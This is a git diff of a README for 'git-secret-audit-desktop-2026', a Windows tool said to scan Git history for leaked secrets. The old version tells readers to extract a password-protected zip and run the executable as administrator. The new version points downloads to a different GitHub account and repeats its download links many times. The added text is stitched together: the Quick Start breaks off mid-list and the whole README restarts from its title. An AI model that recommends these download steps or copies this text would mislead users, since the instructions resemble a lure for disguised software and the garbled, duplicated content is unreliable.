@@ -1,146 +1,210 @@
-# Git Secret Audit Desktop
+# 🔒 git-secret-audit-desktop-2026 - Find Exposed Secrets Before Anyone Else
 
-![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5A5F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
 
-Desktop utility for scanning git repositories for exposed secrets, tokens, and credentials in full commit history.
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
 
-<div align="center">
+git-secret-audit-desktop-2026 is a desktop utility for scanning Git repositories for exposed secrets, tokens, and credentials in full commit history. It helps you check a project folder before you share it, publish it, or hand it to someone else. This guide is written for Windows users who want to download and run the application without programming knowledge.
 
-[![Download Git Secret Audit Desktop v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logoColor=white)](https://github.com/ardahankanatli021/git-secret-audit-desktop-2026/releases/tag/1.0.0)
+## 🚀 Getting Started
 
-</div>
+1. Visit this link to download the application: [https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+2. Wait for the download to finish.
+3. Open the downloaded application from your Downloads folder.
+4. Use the application window to choose the repository folder you want to check.
+5. Start the scan and review the results shown by the application.
 
----
+The application is designed as a desktop utility. You do not need to write commands, edit configuration files, or understand programming languages to use it. The main task is to select a project folder and review the scan results.
 
-## 📋 Overview
+## 📥 Download and Setup
 
-**The problem:** Developers commit secrets by accident. API keys, database passwords, OAuth tokens — they end up in git history and stay there. Even if you delete the file, the secret lives in the commit log. Gitleaks and TruffleHog solve this, but they're CLI-only tools that require flag memorization and JSON parsing.
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
 
-**The solution:** Git Secret Audit Desktop wraps industry-standard secret scanners in a Windows desktop interface. Point it at a repository, click Scan, and get a visual report of every exposed credential — across the full commit history.
+After the download finishes, open the application from your Downloads folder. Use the application window to select the Git repository you want to scan. The utility checks the repository files and its full commit history for exposed secrets, tokens, and credentials. When the scan finishes, review the findings and decide which items need attention.
 
-**Who it's for:** developers, DevOps engineers, and security teams who need to audit repositories for leaked secrets without wrestling with command-line arguments.
+Keep the application in a folder you can find easily, such as your Downloads folder or Desktop. If you move the application later, open it from its new location.
 
----
+## 🧭 What This App Does
 
-## 🧩 Capabilities
+A Git repository is a project folder that stores versions of files over time. Every time someone saves a change, the repository records a snapshot. This is useful for teamwork and for keeping a history of changes. It also means that something removed from the latest version of a file can still exist in older snapshots.
 
-### Secret Detection
-- Full git history scan — catches secrets added then deleted
-- Pattern-based detection via Gitleaks ruleset (AWS keys, Stripe tokens, GitHub PATs, and more)
-- Entropy-based detection for high-entropy strings that don't match known patterns
-- Live credential verification via TruffleHog — checks if detected tokens are still active
+git-secret-audit-desktop-2026 scans those snapshots for exposed secrets. A secret can be a password, an access token, a private key, a connection string, or another value that should stay private. The utility looks through the full commit history, not only the current files. This matters because a secret that was deleted from the visible files may still be present in an older snapshot.
 
-### Multi-Scanner Support
-- Gitleaks integration with custom rule support (`.gitleaks.toml`)
-- TruffleHog integration with configurable verification and multi-layer decoding
-- Custom regex rules for internal credential formats
+The application presents findings in a way that is meant to be readable for non-technical users. You can see what was found, where it was found, and why it may need attention.
 
-### Visual Reports
-- Dashboard view with severity, file path, commit hash, and line number
-- Per-finding remediation guidance
-- Export to JSON, CSV, or SARIF
-- SARIF output drops into GitHub Security tab
+## 🔍 Why Exposed Secrets Matter
 
-### Baseline Management
-- Generate baseline file to suppress known historical findings
-- Continue catching new leaks while ignoring accepted risks
-- Baseline review workflow with documented justifications
+Exposed secrets can allow someone to access an account, a service, or a system without permission. Common examples include API keys, login tokens, database passwords, private keys, and cloud credentials. These values are often placed in project files during development and then forgotten.
 
-### Repository Support
-- Local repository folders
-- Private GitHub repositories (via personal access token)
-- Monorepo support with per-path allowlists
-- Scan changed files only for fast PR-level checks
+Removing a secret from the latest version of a file is not always enough. If the secret was saved in an earlier snapshot, it may still be recoverable from the repository history. A full history scan helps you find these older exposures before the repository is shared publicly or with a wider group.
 
----
+Regular secret scanning is useful before publishing a repository, before sharing it with a contractor, before archiving a project, and after an accidental commit. It also supports security audit workflows and general good hygiene for code projects.
 
-## 🎮 Supported Versions
+## ✨ Key Features
 
-| Component | Version | Status |
-|-----------|---------|--------|
-| Gitleaks | v8.x | ✅ Supported |
-| TruffleHog | v3.x | ✅ Supported |
-| Git | 2.x+ | ✅ Supported |
-| GitHub | Cloud & Enterprise | ✅ Supported |
+- Full commit history scanning for exposed secrets, tokens, and credentials.
+- Detection of common secret types, including passwords, access tokens, API keys, private keys, and connection strings.
+- Clear scan results that help non-technical users understand what was found.
+- Desktop utility workflow for Windows users.
+- Repository folder selection through the application window.
+- Local review of findings so you can decide what needs to be changed.
+- Support for security audit and secret-scanning workflows.
+- Useful before publishing, sharing, or transferring a Git repository.
+- Designed to work with common secret-scanning ideas used by tools such as gitleaks and trufflehog.
+- Readable output that helps you separate real issues from harmless matches.
 
----
+## 🪟 Windows Quick Start
 
-## 💻 System Requirements
+1. Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+2. Wait for the download to complete.
+3. Open the downloaded application from your Downloads folder.
+# 🔒 git-secret-audit-desktop-2026 - Find Exposed Secrets Before Anyone Else
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Windows 10 (64-bit) | Windows 11 |
-| **RAM** | 4 GB | 8 GB |
-| **Storage** | 200 MB | 500 MB |
-| **Git** | 2.x+ in PATH | Latest version |
-| **Node.js** | 20+ (bundled) | 20 LTS |
-| **Permissions** | Standard user | Administrator |
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5A5F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
 
----
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
 
-## 🔧 Installation
+git-secret-audit-desktop-2026 is a desktop utility for scanning Git repositories for exposed secrets, tokens, and credentials in full commit history. It helps you check a project folder before you share it, publish it, or hand it to someone else. This guide is written for Windows users who want to download and run the application without programming knowledge.
 
-1. Download `Git-Secret-Audit-Desktop-v1.0.0.zip` using the button above
-2. Extract with 7-Zip or WinRAR (password shown on the download page)
-3. Right-click `GitSecretAudit.exe` and select **Run as administrator**
-4. Follow the first-run setup wizard
-5. Select a repository folder or enter a GitHub URL with token
-6. Click **Scan** and review the results
+## 🚀 Getting Started
 
----
+1. Visit this link to download the application: [https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+2. Wait for the download to finish.
+3. Open the downloaded application from your Downloads folder.
+4. Use the application window to choose the repository folder you want to check.
+5. Start the scan and review the results shown by the application.
 
-## ❓ FAQ
+The application is designed as a desktop utility. You do not need to write commands, edit configuration files, or understand programming languages to use it. The main task is to select a project folder and review the scan results.
 
-**Is my data safe?**  
-Yes — all scanning happens locally on your machine. No repository contents or findings are uploaded to external servers. The tool only communicates with GitHub APIs if you provide a token for private repo access.
+## 📥 Download and Setup
 
-**Do I need to install Gitleaks or TruffleHog separately?**  
-No — both scanners are bundled with the desktop utility. The tool manages their versions and configurations internally.
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
 
-**Does it work with private repositories?**  
-Yes — provide a GitHub personal access token with repository read access. The tool clones the repository to a temporary local folder and scans it.
+After the download finishes, open the application from your Downloads folder. Use the application window to select the Git repository you want to scan. The utility checks the repository files and its full commit history for exposed secrets, tokens, and credentials. When the scan finishes, review the findings and decide which items need attention.
 
-**Can I integrate this into CI/CD?**  
-The SARIF export format is designed for CI integration. Run the CLI mode (`GitSecretAudit.exe --cli --source . --report-format sarif`) in your pipeline.
+Keep the application in a folder you can find easily, such as your Downloads folder or Desktop. If you move the application later, open it from its new location.
 
-**What about false positives?**  
-The baseline system lets you mark known findings as accepted while continuing to catch new leaks. Each baseline entry should have a documented justification.
+## 🧭 What This App Does
 
-**Does it support monorepos?**  
-Yes — per-path allowlists in the `.gitleaks.toml` configuration let you exclude test fixtures, snapshots, and example configs from the scan.
+A Git repository is a project folder that stores versions of files over time. Every time someone saves a change, the repository records a snapshot. This is useful for teamwork and for keeping a history of changes. It also means that something removed from the latest version of a file can still exist in older snapshots.
 
-**How often should I scan?**  
-Best practice: pre-commit hook for staged changes (fast), PR-level scan for changed files (medium), nightly full-history scan (comprehensive).
+git-secret-audit-desktop-2026 scans those snapshots for exposed secrets. A secret can be a password, an access token, a private key, a connection string, or another value that should stay private. The utility looks through the full commit history, not only the current files. This matters because a secret that was deleted from the visible files may still be present in an older snapshot.
 
-**How do I uninstall?**  
-Run `GitSecretAudit.exe --uninstall` — it removes the tool, bundled scanners, and temporary files.
+The application presents findings in a way that is meant to be readable for non-technical users. You can see what was found, where it was found, and why it may need attention.
 
----
+## 🔍 Why Exposed Secrets Matter
 
-## 🗺️ Roadmap — 2026
+Exposed secrets can allow someone to access an account, a service, or a system without permission. Common examples include API keys, login tokens, database passwords, private keys, and cloud credentials. These values are often placed in project files during development and then forgotten.
 
-- [ ] macOS support (Apple Silicon + Intel)
-- [ ] Linux support via AppImage
-- [ ] GitLab and Bitbucket repository integration
-- [ ] Scheduled scans with email notifications
-- [ ] Team dashboard for organization-wide secret monitoring
-- [ ] Slack and Teams integration for alert routing
+Removing a secret from the latest version of a file is not always enough. If the secret was saved in an earlier snapshot, it may still be recoverable from the repository history. A full history scan helps you find these older exposures before the repository is shared publicly or with a wider group.
 
----
+Regular secret scanning is useful before publishing a repository, before sharing it with a contractor, before archiving a project, and after an accidental commit. It also supports security audit workflows and general good hygiene for code projects.
 
-## 📄 License
+## ✨ Key Features
 
-MIT License — see [LICENSE](LICENSE) for details.
+- Full commit history scanning for exposed secrets, tokens, and credentials.
+- Detection of common secret types, including passwords, access tokens, API keys, private keys, and connection strings.
+- Clear scan results that help non-technical users understand what was found.
+- Desktop utility workflow for Windows users.
+- Repository folder selection through the application window.
+- Local review of findings so you can decide what needs to be changed.
+- Support for security audit and secret-scanning workflows.
+- Useful before publishing, sharing, or transferring a Git repository.
+- Designed to work with common secret-scanning ideas used by tools such as gitleaks and trufflehog.
+- Readable output that helps you separate real issues from harmless matches.
 
----
+## 🪟 Windows Quick Start
 
-<div align="center">
+1. Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+2. Wait for the download to complete.
+3. Open the downloaded application from your Downloads folder.
+4. Choose the Git repository folder you want to scan.
+5. Start the scan.
+6. Review the results and note any secrets that need attention.
 
-[![Download Git Secret Audit Desktop v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logoColor=white)](https://github.com/ardahankanatli021/git-secret-audit-desktop-2026/releases/tag/1.0.0)
+This quick start is intended for a standard Windows desktop. You do not need special tools, command-line experience, or programming knowledge. If you can open a folder and select it in an application window, you can use this utility.
 
-**Version 1.0.0** — Stable Release · Full History Scan · Multi-Scanner · MIT
+## 🛡️ How Secret Scanning Works
 
-</div>
+Secret scanning looks for patterns that commonly appear in passwords, tokens, keys, and other private values. The application reads the repository files and the saved snapshots in the full commit history. It then compares what it finds against known secret patterns and reports matches.
+
+A scan result does not always mean that a secret is actively usable. It means the pattern looks like a secret and should be reviewed. Some matches may be test values, placeholder text, or harmless examples. The application helps you focus on the items that need a closer look.
+
+The scanning process is performed on the repository folder you select. You stay in control of which folder is checked and when the scan runs.
+
+## 📋 What You Need Before You Start
+
+- A Windows computer with a standard desktop environment.
+- The application downloaded from the link in this guide.
+- A Git repository folder that you want to scan.
+- Enough free space for the application and any scan results.
+- Permission to review the repository folder on your computer.
+
+You can scan a repository that you created yourself or one that was shared with you. If the repository belongs to someone else, make sure you have permission to review its contents.
+
+## 🧰 Using the Application
+
+Open the application from the folder where you saved it. In the application window, choose the repository folder you want to check. Start the scan and wait for it to finish. The time needed depends on the size of the repository and the number of saved snapshots.
+
+When the scan completes, review the list of findings. Each finding shows what was detected and where it appears. Use this information to decide whether the item is a real secret that needs to be changed.
+
+If you scan the same repository again after making changes, the application checks the repository as it exists at that moment. This helps you confirm that a secret was removed from the current files and, where applicable, from the full history.
+
+## 📊 Understanding Scan Results
+
+Scan results are organized to help you review findings without needing technical knowledge. A result usually includes the type of secret, the file or snapshot where it appears, and a short excerpt. The excerpt helps you recognize whether the value is a real secret or a harmless example.
+
+Some findings may be labeled with a confidence level. A higher confidence finding is more likely to be a real secret. A lower confidence finding may need more review. Use your own knowledge of the project to decide what is real and what is not.
+
+If a finding looks familiar, check whether it matches a password, token, or key that you or your team uses. If it does, treat it as a real exposure and take action.
+
+## 🧼 What to Do If You Find a Secret
+
+1. Change the secret value in the service or system where it is used.
+2. Remove the secret from the repository files.
+3. Review the full history for older copies of the same secret.
+4. Tell anyone who needs to know about the change.
+5. Run the scan again to confirm the finding is resolved.
+
+Changing the secret is the most important step. Removing it from a file does not cancel the value if someone already copied it. A new value makes the old one unusable. After the change, update the project so it no longer contains the old value.
+
+## ❓ Frequently Asked Questions
+
+**Do I need to install anything else?**
+No. Download the application and open it from your Downloads folder.
+
+**Does the application change my files?**
+The application scans the repository and shows results. Review the findings and make changes yourself where needed.
+
+**Can I scan a repository I did not create?**
+Yes, if you have permission to review the repository folder. Ask the owner before scanning a repository that belongs to someone else.
+
+**What is full commit history?**
+It is the record of saved snapshots in a Git repository. The application checks those snapshots for secrets that may no longer appear in the latest files.
+
+**Why do I see a finding that looks harmless?**
+Secret scanning uses patterns. Some patterns can match test values or placeholder text. Review the finding and decide whether it needs action.
+
+**How long does a scan take?**
+The time depends on the size of the repository and the number of saved snapshots. Smaller repositories usually finish faster.
+
+**Can I scan more than one repository?**
+Yes. Open the application again or choose another folder in the application window when you want to scan a different repository.
+
+## 🆘 Troubleshooting Basics
+
+If the application does not open, check that the download finished completely. Open the file again from your Downloads folder. If you moved the file, open it from its new location.
+
+If the scan seems slow, wait for it to finish. Large repositories with many saved snapshots take longer to check.
+
+If you do not see the repository you want to scan, make sure you selected the correct folder. The folder should be the main project folder that contains the repository.
+
+If a finding is unclear, review the file and snapshot information shown in the result. Use the excerpt to decide whether the value is a real secret or a harmless example.
+
+## 🔐 Privacy and Local Use
+
+The application works with the repository folder you select on your computer. You control which folder is scanned and when the scan runs. Review the results in the application window and decide what to change.
+
+Keep the application in a location you can find easily. If you use the application on a shared computer, make sure you have permission to review the repository folder before you start a scan.
+
+Keywords: devsecops, git-repository, gitleaks, gitleaks-pass, gitleaks-scan, gitleaks-workflow, secret-scanning, secret-scanning-platform, secret-sharing, secrets-detection, security-audit, trufflehog, trufflehog-download
